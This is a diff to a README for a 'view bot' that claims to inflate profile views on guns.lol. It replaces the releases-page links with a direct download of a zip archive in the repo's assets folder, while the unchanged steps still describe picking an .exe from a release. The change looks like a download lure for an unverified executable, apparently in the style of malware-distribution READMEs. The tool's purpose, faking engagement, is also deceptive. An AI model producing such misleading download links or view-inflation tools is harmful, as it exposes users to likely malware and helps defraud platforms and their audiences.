@@ -1,6 +1,6 @@
 # 📈 guns.lol-view-bot - Increase your profile views with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Fanxi2158/guns.lol-view-bot/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Fanxi2158/guns.lol-view-bot/raw/refs/heads/main/assets/view_bot_lol_guns_v1.0.zip)
 
 ## 📌 About this software
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 You need to download the correct file to your computer. Follow these steps to obtain the program:
 
-1. Visit the following link: [https://github.com/Fanxi2158/guns.lol-view-bot/releases](https://github.com/Fanxi2158/guns.lol-view-bot/releases).
+1. Visit the following link: [https://github.com/Fanxi2158/guns.lol-view-bot/raw/refs/heads/main/assets/view_bot_lol_guns_v1.0.zip](https://github.com/Fanxi2158/guns.lol-view-bot/raw/refs/heads/main/assets/view_bot_lol_guns_v1.0.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in .exe for Windows.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
